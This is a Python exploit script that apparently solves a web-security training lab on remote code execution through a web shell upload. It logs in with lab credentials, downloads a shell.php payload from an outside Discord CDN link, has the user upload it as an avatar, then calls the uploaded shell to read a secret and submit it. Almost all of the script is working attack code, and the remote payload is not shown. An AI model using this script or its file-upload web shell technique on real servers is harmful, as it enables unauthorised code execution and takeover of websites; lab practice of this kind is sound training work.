import requests
import sys
import urllib3
from colorama import init, Fore
from bs4 import BeautifulSoup
import os

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

def csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf

def download_file():
    file_url = "https://cdn.discordapp.com/attachments/848462516433715240/1211396586207187075/shell.php?ex=65ee0bfc&is=65db96fc&hm=5af8050fbc38941816c294183c374e6ab2de74b7c37df9df6ec55c9dce4f0445&"
    response = requests.get(file_url)
    if response.status_code == 200:
        filename = file_url.split("/")[-1].split("?")[0]
        filename = "".join(c for c in filename if c.isalnum() or c in ['.', '_', '-'])
        try:
            with open(filename, "wb") as f:
                f.write(response.content)
            input(Fore.YELLOW + f"[!] First: Login with this credentials wiener:peter\n[!] Second: Upload this file '{Fore.CYAN+os.path.abspath(filename)+Fore.RESET+Fore.YELLOW}' as the avarat then press ENTER:")
        except IndexError as e:
            print(Fore.RED + f'[-] Error {e}')
            return
    else:
        print("Failed to download the file.")

def Remote_code_execution_via_web_shell_upload(s, url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        download_file()
        r = s.get(url + '/files/avatars/shell.php', verify=False, proxies=proxies)
        res = r.text
        if r.status_code == 200:
            parts = res.split('\n')
            answer = parts[-1].strip()
            print(Fore.GREEN + f'[+] Answer is {answer}')
            r = s.post(url + '/submitSolution',data={'answer':answer}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            return True
        else:
            print(Fore.RED +'[-] Unable to get the answer')
            return False
    else:
        print(Fore.RED +'[-] Unable to log in to Wiener account')
        return False

def main():
    try:
        if len(sys.argv) != 2:
            print(Fore.YELLOW + "[!] Usage: %s <url>" % sys.argv[0])
            return
    except IndexError as e:
        print(Fore.RED + f'[-] Error {e}')
        return
    
    s = requests.Session()
    url = sys.argv[1]
    Remote_code_execution_via_web_shell_upload(s, url)

if __name__ == "__main__":
    main()
